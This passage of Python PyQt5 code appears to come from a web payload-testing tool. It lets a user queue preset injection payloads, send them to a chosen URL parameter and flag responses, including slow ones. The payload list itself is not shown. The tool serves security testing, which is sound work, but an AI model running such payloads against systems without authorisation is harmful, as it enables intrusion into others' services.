            cat_item.setFont(0, QFont("Segoe UI", 10, QFont.Bold))
            cat_item.setForeground(0, QColor("#E2E8F0"))
            cat_item.setData(0, Qt.UserRole, {"type": "category", "category": category})
            self.preset_tree.addTopLevelItem(cat_item)

            desc = QTreeWidgetItem([f"  ↳ {data['description']}"])
            desc.setForeground(0, QColor("#9CA3AF"))
            desc.setFlags(desc.flags() & ~Qt.ItemIsSelectable)
            font = QFont("Segoe UI", 9)
            font.setItalic(True)
            desc.setFont(0, font)
            cat_item.addChild(desc)

            for payload, label in payloads:
                child = QTreeWidgetItem([f"  {payload}"])
                child.setForeground(0, QColor("#CBD5E1"))
                child.setToolTip(0, f"{label}\n\n{payload}")
                child.setData(0, Qt.UserRole, {
                    "type": "payload",
                    "payload": payload,
                    "label": label,
                    "category": category,
                })
                cat_item.addChild(child)
                self._all_presets.append((category, payload, label))

            cat_item.setExpanded(bool(ft))  # expand on search

        if not ft:
            # Expand first category by default
            if self.preset_tree.topLevelItemCount():
                self.preset_tree.topLevelItem(0).setExpanded(True)

    def _filter_presets(self, text: str):
        self._populate_preset_tree(filter_text=text)

    # ─────────────────────────────────────────────────────────────────────────
    # Preset interactions
    # ─────────────────────────────────────────────────────────────────────────

    def _on_preset_double_click(self, item, col):
        data = item.data(0, Qt.UserRole)
        if data and data.get("type") == "payload":
            self._append_to_editor(data["payload"])

    def _add_selected_to_editor(self):
        for item in self.preset_tree.selectedItems():
            data = item.data(0, Qt.UserRole)
            if data and data.get("type") == "payload":
                self._append_to_editor(data["payload"])

    def _add_category_to_editor(self):
        for item in self.preset_tree.selectedItems():
            data = item.data(0, Qt.UserRole)
            if not data:
                continue
            category = data.get("category")
            if not category or category not in PRESET_LIBRARY:
                continue
            for payload, _ in PRESET_LIBRARY[category]["payloads"]:
                self._append_to_editor(payload)

    def _append_to_editor(self, payload: str):
        current = self.payload_editor.toPlainText().rstrip("\n")
        if current:
            # Avoid duplicates
            existing = set(current.splitlines())
            if payload in existing:
                return
            self.payload_editor.setPlainText(current + "\n" + payload)
        else:
            self.payload_editor.setPlainText(payload)

    # ─────────────────────────────────────────────────────────────────────────
    # Editor helpers
    # ─────────────────────────────────────────────────────────────────────────

    def _update_payload_count(self):
        lines = [l for l in self.payload_editor.toPlainText().splitlines() if l.strip()]
        self.payload_count_lbl.setText(f"{len(lines)} payload{'s' if len(lines)!=1 else ''}")

    def _clear_editor(self):
        self.payload_editor.clear()

    def _copy_editor(self):
        QApplication.clipboard().setText(self.payload_editor.toPlainText())

    # ─────────────────────────────────────────────────────────────────────────
    # Run payloads
    # ─────────────────────────────────────────────────────────────────────────

    def _build_run_config(self) -> dict:
        method_text = self.method_combo.currentText()
        if method_text == "GET":
            method = "GET"
            inject_json = False
        elif method_text == "POST (JSON)":
            method = "POST"
            inject_json = True
        else:
            method = "POST"
            inject_json = False

        extra_raw = self.extra_body.text().strip()
        json_body = {}
        form_body = {}

        if extra_raw:
            try:
                parsed = json.loads(extra_raw)
                json_body = parsed
                form_body = parsed
            except Exception:
                # Try key=value pairs
                for pair in extra_raw.split("&"):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        form_body[k.strip()] = v.strip()
                        json_body[k.strip()] = v.strip()

        return {
            "url":          self.target_url.text().strip(),
            "param":        self.target_param.text().strip(),
            "method":       method,
            "inject_json":  inject_json,
            "json_body":    json_body,
            "form_body":    form_body,
            "timeout":      self.cfg_timeout.value(),
            "delay":        self.cfg_delay.value(),
            "time_threshold": self.cfg_time_flag.value(),
        }

    def _get_jobs(self) -> list:
        lines = [l.strip() for l in self.payload_editor.toPlainText().splitlines()
                 if l.strip() and not l.startswith("#")]

        # Try to attach labels from preset library
        preset_map = {p: l for _, p, l in self._all_presets}
        return [{"payload": p, "label": preset_map.get(p, "")} for p in lines]

    def _run_payloads(self):
        jobs = self._get_jobs()
        url = self.target_url.text().strip()
        param = self.target_param.text().strip()
        if not jobs:
            self.run_status.setText("No payloads in queue.")
            return
        if not url or not param:
            self.run_status.setText("Enter a target URL and parameter first.")
            return
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
            self.target_url.setText(url)
        self._results = []
        self.results_table.setRowCount(0)
        self.flagged_count.setText("")
        self.run_btn.hide()
        self.stop_run_btn.show()
        self.run_btn.setEnabled(False)
        config = self._build_run_config()
        config["url"] = url
        config["param"] = param
        self._worker = RunnerWorker(jobs, config)
        self._worker.result_signal.connect(self._on_result)
        self._worker.done_signal.connect(self._on_run_done)
        self._worker.start()
        self.run_status.setText(f"Running {len(jobs)} payloads…")

    def _stop_run(self):
        if self._worker:
            self._worker.stop()
            self._worker.terminate()
        self._run_finished()

    def _run_finished(self):
        self.run_btn.show()
        self.run_btn.setEnabled(True)
        self.stop_run_btn.hide()

    # ─────────────────────────────────────────────────────────────────────────
    # Result handling
    # ─────────────────────────────────────────────────────────────────────────

    def _on_result(self, result: dict):
        # Collect results and update the table immediately for feedback
        print("[DEBUG] Received result:", result)  # Debug log to stdout
        self._results.append(result)
        # Add row to table immediately
        self._add_result_row(result)
        self.results_table.scrollToBottom()
        self.results_table.resizeColumnsToContents()


    def _on_run_done(self, total: int):
        print(f"[DEBUG] _on_run_done called with total={total}, results={len(self._results)}")
        # Optionally, could re-batch the table here, but now rows are added live
        flagged = sum(1 for r in self._results if r.get("flagged"))
        clean   = total - flagged
        self.run_status.setText(
            f"Done - {total} payloads  |  {flagged} flagged  |  {clean} clean"
            + ("  -  Click any flagged row to see the response." if flagged
               else "  -  No issues detected with these payloads.")
        )
        self._run_finished()

    def _on_result_selected(self):
        row = self.results_table.currentRow()
        if 0 <= row < len(self._results):
            self.response_viewer.show_result(self._results[row])

    # ─────────────────────────────────────────────────────────────────────────
    # Misc
    # ─────────────────────────────────────────────────────────────────────────

    def _clear_results(self):
        self._results = []
        self.results_table.setRowCount(0)
        self.flagged_count.setText("")
        self.run_status.setText("")
        if hasattr(self, "show_flagged_only"):
            self.show_flagged_only.setChecked(False)
        self._show_no_results_placeholder()

    def _export_csv(self):
        if not self._results:
            return
        from PyQt5.QtWidgets import QFileDialog
        path, _ = QFileDialog.getSaveFileName(
            self, "Export Results", "payload_results.csv",
            "CSV Files (*.csv);;All Files (*)"
        )
        if path:
            try:
                with open(path, "w", encoding="utf-8") as f:
                    f.write("index,payload,status,length,time_s,flagged,flag_reason,response_snippet\n")
                    for r in self._results:
                        snippet = r.get("response_snippet","").replace('"','""').replace("\n"," ")
                        f.write(
                            f'{r["index"]},'
                            f'"{r["payload"]}",'
                            f'{r["status"]},'
                            f'{r["length"]},'
                            f'{r["time"]},'
                            f'{r["flagged"]},'
                            f'"{r.get("flag_reason","")}",'
                            f'"{snippet[:200]}"\n'
                        )
            except Exception as e:
                print(f"Export error: {e}")

    # ─────────────────────────────────────────────────────────────────────────
    # Shared style snippets
    # ─────────────────────────────────────────────────────────────────────────

    def _input_style(self):
        return """
            QLineEdit, QComboBox {
                background: #212D42;
                border: 1px solid #2A3A52;
                border-radius: 7px;
                padding: 6px 10px;
                font-size: 12px;
                color: #E2E8F0;
            }
            QLineEdit:focus, QComboBox:focus { border-color: #4C8EF7; }
        """

    def _spin_style(self):
        return """
            QSpinBox {
                background: #212D42;
                border: 1px solid #2A3A52;
                border-radius: 6px;
                padding: 4px 6px;
                font-size: 12px;
                color: #E2E8F0;
            }
            QSpinBox:focus { border-color: #4C8EF7; }
        """

    def _icon_btn_style(self):
        return """
            QPushButton {
                background: #263347;
                color: #E2E8F0;
                border: 1px solid #2A3A52;
                border-radius: 7px;
                padding: 6px 12px;
                font-size: 12px;
            }
            QPushButton:hover {
                background: #263347;
                color: #4C8EF7;
                border-color: #4C8EF7;
            }
        """